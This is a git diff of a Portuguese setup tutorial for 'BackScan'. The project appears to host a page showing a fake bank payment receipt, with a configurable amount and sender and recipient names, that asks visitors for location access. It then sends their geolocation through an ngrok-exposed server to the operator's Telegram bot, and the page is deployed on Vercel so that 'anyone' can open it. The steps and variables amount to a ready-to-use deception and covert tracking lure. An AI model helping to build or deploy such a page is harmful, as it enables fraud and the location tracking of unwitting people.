@@ -2,8 +2,6 @@
 
 Este tutorial irá guiar um iniciante absoluto para configurar um ambiente de desenvolvimento no Ubuntu e rodar o projeto **BackScan**.
 
----
-
 ## 1. Atualizar o Sistema Operacional
 
 Antes de começar, é recomendado atualizar os pacotes do Ubuntu.
@@ -11,8 +9,6 @@ Antes de começar, é recomendado atualizar os pacotes do Ubuntu.
 ```bash
 sudo apt update && sudo apt upgrade -y
 ```
-
----
 
 ## 2. Instalar o Node.js e o npm
 
@@ -40,8 +36,6 @@ node -v  # Deve exibir a versão do Node.js
 npm -v   # Deve exibir a versão do npm
 ```
 
----
-
 ## 3. Instalar o Git
 
 O Git é necessário para clonar o projeto.
@@ -56,8 +50,6 @@ Verifique a instalação:
 git --version
 ```
 
----
-
 ## 4. Clonar o Repositório BackScan
 
 ```bash
@@ -65,22 +57,18 @@ git clone https://github.com/PedroHBessa/backscan.git
 cd backscan
 ```
 
----
-
 ## 5. Instalar as Dependências do Projeto
 
 ```bash
 npm install
 ```
 
----
-
 ## 6. Configurar as Variáveis do Projeto
 
-Edite o arquivo `server.js` que está em `src/server.js`:
+Edite o arquivo `server.js`:
 
 ```bash
-nano src/server.js
+nano server.js
 ```
 
 Substitua **BOT-TOKEN** pelo token do seu bot do Telegram.
@@ -88,8 +76,6 @@ Substitua **BOT-TOKEN** pelo token do seu bot do Telegram.
 Substitua **CHAT-TOKEN** pelo ID do chat ou grupo onde deseja receber as mensagens.
 
 Pressione **CTRL + X**, depois **Y** e **Enter** para salvar.
-
----
 
 ## 7. Criar e Configurar um Bot no Telegram
 
@@ -108,17 +94,13 @@ Pressione **CTRL + X**, depois **Y** e **Enter** para salvar.
      ```
    - Anote o `chat_id`.
 
----
-
 ## 8. Iniciar o Servidor
 
 ```bash
-node src/server.js
+node server.js
 ```
 
 Se tudo estiver correto, a saída deve indicar que o servidor está rodando.
-
----
 
 ## 9. Instalar e Configurar o Ngrok
 
@@ -143,8 +125,6 @@ Após criar a conta, pegue seu **Authtoken** e rode:
 ngrok authtoken SEU_AUTHTOKEN
 ```
 
----
-
 ## 10. Expor o Servidor com o Ngrok
 
 ```bash
@@ -153,14 +133,12 @@ ngrok http 8088
 
 Copie a **URL gerada pelo Ngrok** (exemplo: `https://abc123.ngrok.io`).
 
----
-
 ## 11. Atualizar a URL no Projeto
 
-Abra o arquivo `script.js` que está em `src/script.js`:
+Abra o arquivo `script.js`:
 
 ```bash
-nano src/script.js
+nano script.js
 ```
 
 Na linha 7, substitua `https://abc123.ngrok.io` pela URL gerada pelo Ngrok:
@@ -171,13 +149,41 @@ const NGROK_SERVER_URL = "https://abc123.ngrok.io";
 
 Salve as alterações (**CTRL + X**, **Y**, **Enter**).
 
----
+## 11.1 Variáveis opcionais
+
+Se caso quiser mudar o valor do comprovante, ou alterar os nomes das pessoas no comprovante é possível.
+
+Abra o arquivo `script.js`:
+
+```bash
+nano script.js
+```
+
+Na linha 9, você pode alterar o valor padrão do comprovante (que é de R$800,00):
+
+```bash
+const VALUE = 1000
+```
+
+Na linha 10, você pode alterar o nome do destinatário:
+
+```bash
+const RECIPIENT_NAME = "Fulano da Silva"
+```
+
+Na linha 11, você pode alterar o nome do remetente:
+
+```bash
+const SENDER_NAME = "Ciclano Araújo"
+```
+
+Se caso deixar os campos de nome vazios, eles serão gerados de forma aleatória.
+
+Salve as alterações (**CTRL + X**, **Y**, **Enter**).
 
 ## 12. Testar o Projeto
 
 Abra o **index.html** no navegador e permita o acesso à localização. Se tudo estiver correto, a localização será enviada para o bot no Telegram.
-
----
 
 ## 13. Hospedar a Página HTML na Vercel
 
@@ -208,8 +214,6 @@ git push -u origin main
 3. Após a implantação, copie a URL gerada (ex: `https://backscan.vercel.app`).
 
 Agora qualquer pessoa pode acessar sua página! 🚀
-
----
 
 ## Conclusão
 
